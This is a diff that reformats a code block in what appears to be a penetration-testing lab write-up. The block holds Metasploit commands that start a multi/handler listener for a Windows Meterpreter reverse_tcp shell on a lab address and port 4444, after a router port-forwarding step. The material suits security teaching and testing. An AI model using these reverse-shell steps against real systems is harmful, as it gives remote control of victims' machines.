@@ -153,15 +153,13 @@ The router’s port-forwarding rule is designed to send those packets to the Att
 
 Then I returned to Metasploit to set up and activate the listener using the multi/handler exploit, as can be seen in Figure 10. The listener was set to listen on the Attack PC’s IP address (192.168.1.4) on port 4444.
 
-<pre><code><span style="color:rgba(255, 255, 255, 0.5)">msf6 ></span> use exploit/multi/handler</code></pre>
-
-<pre><code><span style="color:rgba(255, 255, 255, 0.5)">msf6 ></span> set PAYLOAD windows/meterpreter/reverse_tcp</code></pre>
-
-<pre><code><span style="color:rgba(255, 255, 255, 0.5)">msf6 ></span> set LHOST 192.168.1.4</code></pre>
-
-<pre><code><span style="color:rgba(255, 255, 255, 0.5)">msf6 ></span> set LPORT 4444</code></pre>
-
-<pre><code><span style="color:rgba(255, 255, 255, 0.5)">msf6 ></span> run</code></pre>
+<pre>
+<code><span style="color:rgba(255, 255, 255, 0.5)">msf6 ></span> use exploit/multi/handler</code>
+<code><span style="color:rgba(255, 255, 255, 0.5)">msf6 ></span> set PAYLOAD windows/meterpreter/reverse_tcp</code>
+<code><span style="color:rgba(255, 255, 255, 0.5)">msf6 ></span> set LHOST 192.168.1.4</code>
+<code><span style="color:rgba(255, 255, 255, 0.5)">msf6 ></span> set LPORT 4444</code>
+<code><span style="color:rgba(255, 255, 255, 0.5)">msf6 ></span> run</code>
+</pre>
 
 #### Figure 10
 
